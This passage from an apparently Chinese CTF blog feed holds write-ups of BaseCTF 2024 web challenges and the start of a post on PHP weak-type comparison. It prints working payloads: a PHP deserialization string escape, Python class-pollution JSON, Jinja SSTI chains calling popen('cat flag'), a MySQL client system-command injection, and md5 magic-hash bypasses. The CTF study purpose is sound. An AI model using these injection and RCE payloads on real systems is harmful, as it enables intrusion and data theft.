class="hljs-keyword">new</span> E;<br><span class="hljs-variable">$exp</span>-&gt;start-&gt;c-&gt;t-&gt;f-&gt;e=<span class="hljs-keyword">new</span> R;<br><span class="hljs-variable">$exp</span>-&gt;start-&gt;c-&gt;t-&gt;f-&gt;e-&gt;r=<span class="hljs-string">&quot;system(&#x27;ls&#x27;);&quot;</span>;<br><span class="hljs-variable">$orange</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;1&#x27;</span>=&gt;<span class="hljs-variable">$exp</span>,<span class="hljs-string">&#x27;2&#x27;</span>=&gt;<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$orange</span>);<br></code></pre></td></tr></table></figure><p>得到的答案需要在本地测试一下前面的内容</p><p><img src="/../../images/basectf/basectf2024/ez.png" alt="ez"></p><p>然后前面的需要进行字符串逃逸，这里不再赘婿，可以看我<a href="https://0ran9ewww.github.io/2024/08/28/nepctf/nepctf2024/#PHP-MASTER">文章</a>,</p><p><img src="/../../images/basectf/basectf2024/ez-1.png" alt="ez-1"></p><p>测出长度是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">?substr=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%9f<br>&amp;ez[ser.from_you=a:2:&#123;i:1;O:6:<span class="hljs-string">&quot;Hacker&quot;</span>:3:&#123;s:5:<span class="hljs-string">&quot;start&quot;</span>;O:1:<span class="hljs-string">&quot;C&quot;</span>:1:&#123;s:1:<span class="hljs-string">&quot;c&quot;</span>;O:1:<span class="hljs-string">&quot;T&quot;</span>:1:&#123;s:1:<span class="hljs-string">&quot;t&quot;</span>;O:1:<span class="hljs-string">&quot;F&quot;</span>:1:&#123;s:1:<span class="hljs-string">&quot;f&quot;</span>;O:1:<span class="hljs-string">&quot;E&quot;</span>:1:&#123;s:1:<span class="hljs-string">&quot;e&quot;</span>;O:1:<span class="hljs-string">&quot;R&quot;</span>:1:&#123;s:1:<span class="hljs-string">&quot;r&quot;</span>;s:15:<span class="hljs-string">&quot;system(&#x27;ls /&#x27;);&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:3:<span class="hljs-string">&quot;end&quot;</span>;s:6:<span class="hljs-string">&quot;hacker&quot;</span>;s:8:<span class="hljs-string">&quot;username&quot;</span>;R:9;&#125;i:1;N;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">?substr=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%9f<br>&amp;ez[ser.from_you=a:2:&#123;i:1;O:6:<span class="hljs-string">&quot;Hacker&quot;</span>:3:&#123;s:5:<span class="hljs-string">&quot;start&quot;</span>;O:1:<span class="hljs-string">&quot;C&quot;</span>:1:&#123;s:1:<span class="hljs-string">&quot;c&quot;</span>;O:1:<span class="hljs-string">&quot;T&quot;</span>:1:&#123;s:1:<span class="hljs-string">&quot;t&quot;</span>;O:1:<span class="hljs-string">&quot;F&quot;</span>:1:&#123;s:1:<span class="hljs-string">&quot;f&quot;</span>;O:1:<span class="hljs-string">&quot;E&quot;</span>:1:&#123;s:1:<span class="hljs-string">&quot;e&quot;</span>;O:1:<span class="hljs-string">&quot;R&quot;</span>:1:&#123;s:1:<span class="hljs-string">&quot;r&quot;</span>;s:20:<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:3:<span class="hljs-string">&quot;end&quot;</span>;s:6:<span class="hljs-string">&quot;hacker&quot;</span>;s:8:<span class="hljs-string">&quot;username&quot;</span>;R:9;&#125;i:1;N;&#125;<br></code></pre></td></tr></table></figure><p>cx师傅又让我学到了</p><h3 id="Jinja-Mark"><a href="#Jinja-Mark" class="headerlink" title="Jinja Mark"></a>Jinja Mark</h3><p>在&#x2F;flag里面可以fuzz一下得到提示,不确定这个是动态还是静态的，最好自己bp跑一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lucky_number=5346<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">BLACKLIST_IN_index = [<span class="hljs-string">&#x27;&#123;&#x27;</span>,<span class="hljs-string">&#x27;&#125;&#x27;</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/magic&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pollute</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">if</span> request.is_json:<br>            merge(json.loads(request.data), instance)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;这个魔术还行吧&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我要json的魔术&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;记得用POST方法把魔术交上来&quot;</span><br></code></pre></td></tr></table></figure><p>得到了提示，index禁用了花括号，然后这是一个python原生类的题目~暂时没思路了，是要通过原生类进行ssti，还是通过这个进行简单的花括号绕过呢</p><p>续言：没错就是进行简单的花括号绕过，用其他代替就好了<code>jinja_env</code> 配置了 Jinja2 的模板引擎环境，通过修改 <code>variable_start_string</code> 和 <code>variable_end_string</code> 来控制模板变量的起始和结束符号。只是我知识面比较窄而已，利用post发包</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;__init__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;__globals__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;app&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;jinja_env&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;variable_start_string&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&lt;&lt;&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;variable_end_string&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&gt;&gt;&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Content-Type: application/json<br></code></pre></td></tr></table></figure><p>最后直接在对应的界面进行简单的ssti注入就行了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;&lt;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;cat flag&#x27;</span>).<span class="hljs-built_in">read</span>()&gt;&gt;<br></code></pre></td></tr></table></figure><h3 id="Back-to-the-future"><a href="#Back-to-the-future" class="headerlink" title="Back to the future"></a>Back to the future</h3><p>一时间没想起来怎么写，在nss刷题的时候突然就想起来了，默认去看一下robots.txt，通常不要扫描的都在这里，提醒的是.git然后用githacker这个工具进行恢复，利用git reset –hard 第二个恢复flag</p><p>续：有师傅和我说githack不能直接得到，我用的是gitdumper下来再用githacker的，也可以按这么来。</p><h3 id="RCE-or-Sql-Inject"><a href="#RCE-or-Sql-Inject" class="headerlink" title="RCE or Sql Inject"></a>RCE or Sql Inject</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$sql</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sql&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/se|ec|;|@|del|into|outfile/i&#x27;</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你知道的，不可能有sql注入&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&quot;|\$|`|\\\\/i&#x27;</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你知道的，不可能有RCE&quot;</span>);<br>&#125;<br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;mysql -u root -p123456 -e \&quot;use ctf;select &#x27;ctfer! You can\\&#x27;t succeed this time! hahaha&#x27;; -- &quot;</span> . <span class="hljs-variable">$sql</span> . <span class="hljs-string">&quot;\&quot;&quot;</span>;<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$query</span>); ctfer! You can<span class="hljs-string">&#x27;t succeed this time! hahaha ctfer! You can&#x27;</span>t succeed this time! hahaha<br></code></pre></td></tr></table></figure><p>学习学习吧，给的hint告诉了这题其实已经是rce的题目了</p><p>R! C! E!mysql远程连接和命令行操作是不是有些区别呢输个问号看看?</p><p>本地mysql连接输入?看看有一行可以注意到（我在物理机测试上并没有，可能是版本问题，之后会在vps上测一下）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">system (\!) Execute a system shell command.<br></code></pre></td></tr></table></figure><p>那么就是使用system或者<code>\!</code>执行一个system shell命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?sql=%0asystem <span class="hljs-built_in">env</span><br></code></pre></td></tr></table></figure><p>冷知识＋1</p><h3 id="Sql-Inject-or-RCE"><a href="#Sql-Inject-or-RCE" class="headerlink" title="Sql Inject or RCE"></a>Sql Inject or RCE</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br>highlight_file(__FILE__);<br><span class="hljs-variable">$sql</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sql&#x27;</span>];<br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/se|ec|st|;|@|delete|into|outfile/i&#x27;</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    die(<span class="hljs-string">&quot;你知道的，不可能有sql注入&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&quot;|\$|`|\\\\/i&#x27;</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    die(<span class="hljs-string">&quot;你知道的，不可能有RCE&quot;</span>);<br>&#125;<br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;mysql -u root -p123456 -e \&quot;use ctf;select &#x27;ctfer! You can\\&#x27;t succeed this time! hahaha&#x27;; -- &quot;</span> . <span class="hljs-variable">$sql</span> . <span class="hljs-string">&quot;\&quot;&quot;</span>;<br>system(<span class="hljs-variable">$query</span>); ctfer! You can<span class="hljs-string">&#x27;t succeed this time! hahaha ctfer! You can&#x27;</span>t succeed this time! hahaha<br></code></pre></td></tr></table></figure><p>在上一题的基础上过滤了system，并且把过滤的del变成了delete，所以可以考虑从del这方面入手。</p><p><code>DELIMITER</code> 是一个用于改变 SQL 语句结束符的命令，通常用于定义存储过程、触发器或函数时，因为这些语句内部会使用 <code>;</code>，而 <code>;</code> 也是 MySQL 默认的语句结束符。简单的说可以把DELIMITER当作；，但是我们可以自定义这个。</p><p>handler是MySQL特有的，可以逐行浏览某个表中的数据，格式：</p><p>打开表：HANDLER 表名 OPEN ;</p><p>查看数据： HANDLER 表名 READ next;</p><p>关闭表： HANDLER 表名 READ CLOSE；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?sql=%0adelimiter orange%0a handler flag openorange%0ahandler flag <span class="hljs-built_in">read</span> next<br></code></pre></td></tr></table></figure><p>实际执行的是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">delimiter orange<br>handler flag openorange<br>handler flag read next<br></code></pre></td></tr></table></figure><h3 id="Lucky-Number"><a href="#Lucky-Number" class="headerlink" title="Lucky Number"></a>Lucky Number</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request,render_template_string,render_template<br><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Template<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> heaven<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">cls</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br>instance = cls()<br><br>BLACKLIST_IN_index = [<span class="hljs-string">&#x27;&#123;&#x27;</span>,<span class="hljs-string">&#x27;&#125;&#x27;</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_json</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">try</span>:<br>        json.loads(data)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/m4G1c&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pollute</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">if</span> request.is_json:<br>            merge(json.loads(request.data), instance)<br>            result = heaven.create()<br>            message = result[<span class="hljs-string">&quot;message&quot;</span>]<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;这个魔术还行吧</span><br><span class="hljs-string">&quot;</span> + message<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我要json的魔术&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;记得用POST方法把魔术交上来&quot;</span><br><br><br><span class="hljs-comment">#heaven.py</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">kon=<span class="hljs-string">&quot;Kon&quot;</span>, pure=<span class="hljs-string">&quot;Pure&quot;</span>, *, confirm=<span class="hljs-literal">False</span></span>):<br>    <span class="hljs-keyword">if</span> confirm <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;lucky_number&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> create.__kwdefaults__:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;嗯嗯，我已经知道你要创造东西了，但是你怎么不告诉我要创造什么？&quot;</span>, <span class="hljs-string">&quot;lucky_number&quot;</span>: <span class="hljs-string">&quot;nope&quot;</span>&#125;<br>    <span class="hljs-keyword">if</span> confirm <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;lucky_number&quot;</span> <span class="hljs-keyword">in</span> create.__kwdefaults__:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;这是你的lucky_number，请拿好，去/check下检查一下吧&quot;</span>, <span class="hljs-string">&quot;lucky_number&quot;</span>: create.__kwdefaults__[<span class="hljs-string">&quot;lucky_number&quot;</span>]&#125;<br><br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;你有什么想创造的吗？&quot;</span>, <span class="hljs-string">&quot;lucky_number&quot;</span>: <span class="hljs-string">&quot;nope&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>也是一道原生类的题目orz</p><p>从已知的代码进行分析，在heaven.py里有create函数的<code>__kwdefaults__</code>,同时还需要confirm是true.涉及动态加载模块或处理模块之间的依赖时,需要<code>sys.modules</code> 来访问已经加载的模块.回到代码中并没有导入sys模组，这时可以利用python的内置函数<code>__spec__</code>.包含了关于类加载时的信息，定义在Lib&#x2F;importlib&#x2F;_bootstrap.py的类ModuleSpec，所以可以直接采用&lt;模块名&gt;.<strong>spec</strong>.<strong>init</strong>.<strong>globals</strong>[‘sys’]获取到sys模块，此处就可以使用json模块获取.(以上跟着官p学的，我还没学这么多orz)</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Content-Type: application/json<br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs json"><br><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;__init__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;__globals__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;json&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;__spec__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;__init__&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;__globals__&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                            <span class="hljs-attr">&quot;sys&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                <span class="hljs-attr">&quot;modules&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                    <span class="hljs-attr">&quot;heaven&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                        <span class="hljs-attr">&quot;create&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                              <span class="hljs-attr">&quot;__kwdefaults__&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                              <span class="hljs-attr">&quot;confirm&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                                              <span class="hljs-attr">&quot;lucky_number&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;5346&quot;</span><br>                                             <span class="hljs-punctuation">&#125;</span> <br>                                        <span class="hljs-punctuation">&#125;</span><br>                                    <span class="hljs-punctuation">&#125;</span><br>                                <span class="hljs-punctuation">&#125;</span><br>                            <span class="hljs-punctuation">&#125;</span><br>                        <span class="hljs-punctuation">&#125;</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>然后会变成<code>快去/ssSstTti1注入吧</code></p><p>然后就是普通的无过滤的ssti注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;cat flag&#x27;</span>).<span class="hljs-built_in">read</span>()&#125;&#125;<br></code></pre></td></tr></table></figure><h3 id="Just-Readme"><a href="#Just-Readme" class="headerlink" title="Just Readme"></a>Just Readme</h3><p>官p给的是<a href="https://github.com/ambionics/cnext-exploits">ambionics&#x2F;cnext-exploitsCNEXT 的漏洞(CVE-2024-2961)</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深入浅出PHP强弱比较</title>
    <link href="/2024/08/04/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E5%BC%BA%E5%BC%B1%E6%AF%94%E8%BE%83/"/>
    <url>/2024/08/04/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E5%BC%BA%E5%BC%B1%E6%AF%94%E8%BE%83/</url>
    
    <content type="html"><![CDATA[<p>鉴于最近打的一个比赛，来了解一下ctf中经常出现的弱等于强等于的问题</p><h2 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h2><h3 id="Q1-二者弱比教"><a href="#Q1-二者弱比教" class="headerlink" title="Q1:二者弱比教"></a>Q1:二者弱比教</h3><p>这部分内容自己检索，简要的说<code>==</code>的情况下，左右两边的类型会进行转化。</p><p>举个例子来说</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span>&amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>))<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are right!&quot;</span>;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;erro&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>如题，需要我们传入的内容不一样，但是MD5加密之后需要相同</p><p>常见的做法有两种</p><p>方法一：</p><p>弱比教数组绕过，payload如下</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?a[]=1&amp;b[]=2<br></code></pre></td></tr></table></figure><p>先进行数组的比较，1！&#x3D;2，再md5加密，对于对数组的加密，默认是Null，两者加密之后相同</p><p>方法二：</p><p>常见的知识积累</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?a=240610708&amp;b=s214587387a0<br></code></pre></td></tr></table></figure><p>原理是两者MD5加密之后开头都是0e，在php语言中，0e会在php解释为0</p><p>以下是常见的一些</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">QNKCDZO<br>240610708<br>s878926199a<br>s155964671a<br>s214587387a0<br></code></pre></td></tr></table></figure><p>sha1的弱比教类比上面的内容</p><h3 id="Q2-自身弱比教"><a href="#Q2-自身弱比教" class="headerlink" title="Q2:自身弱比教"></a>Q2:自身弱比教</h3><p>例题如下</p><figure class="highlight php"><table><tr><td 